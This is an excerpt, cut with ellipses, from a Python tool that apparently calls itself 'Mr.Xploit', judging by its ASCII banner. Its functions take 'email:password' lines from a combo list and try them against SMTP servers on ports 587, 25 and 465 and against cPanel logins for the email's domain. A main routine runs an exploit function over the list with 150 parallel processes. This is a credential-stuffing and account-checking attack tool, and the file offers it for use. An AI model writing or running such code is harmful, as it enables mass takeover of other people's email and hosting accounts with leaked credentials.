...
def SMTP_invincible(c):
    try :
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        host = URLdomain_invincible(email.split('@')[1])
        ports = ['587', '25', '465']
        for port in ports :
            try :
                if (port == '465'):
...
def CpanelChecker_invincible(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_invincible(email.split('@')[1])
...
def xombo():
    ...
    try:
        ...
        yList = str(input_invincible('\n   Your Combo-List --> : '))
        if (not os.path.isfile(yList)):
            print("\n   {}({}) File does not exist!\n".format(fr, yList))
            sys.exit(0)
        target = open(yList, 'r')
    mp = Pool(150)
    mp.map(zxploit, target)
    mp.close()
    mp.join()
...
|_   \  /   _|        |_  _||_  _|       [  |         (_) / |_  
  ...
  | |\  /| |  [ `/'`\]   > `' <  [ '/'`\ \| |/ .'`\ \[  | | |   
 _| |_\/_| |_  | |  _  _/ /'`\ \_ | \__/ || || \__. | | | | |,  
|_____||_____|[___](_)|____||____|| ;.__/[___]'.__.' [___]\__/  
                                 [__|                           
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'''
